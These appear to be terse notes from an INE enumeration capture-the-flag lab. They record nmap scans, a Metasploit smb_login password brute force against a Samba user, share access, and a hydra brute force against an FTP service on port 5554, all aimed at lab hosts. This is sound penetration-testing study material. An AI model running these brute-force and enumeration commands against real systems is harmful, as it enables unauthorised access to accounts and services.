Assessment Methodologies: Enumeration CTF 
`nmap -sC -sV target.ine.local — min-rate 1000`
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

josh
nancy 
bob

use auxiliary/scanner/smb/smb_login
set RHOSTS 192.2.168.3
set SMBUser josh
set PASS_FILE /root/Desktop/wordlists/unix_passwords.txt
set createsession true
run

`sessions 1`
`shares -i josh` 
josh purple

`nmap -p- target.ine.local `
scan all port

`ftp -p target.ine.local 5554`
Connected to target.ine.local.
220 Welcome to blah FTP service. Reminder to users, specifically ashley, alice and amanda to change their weak passwords immediately!!!
Name (target.ine.local:root): 


`hydra -l admin -P passwords.txt -s 5554 192.248.251.3 ftp -t 64`
meta ช้ามาก ไม่แนะนำ (-L -> file)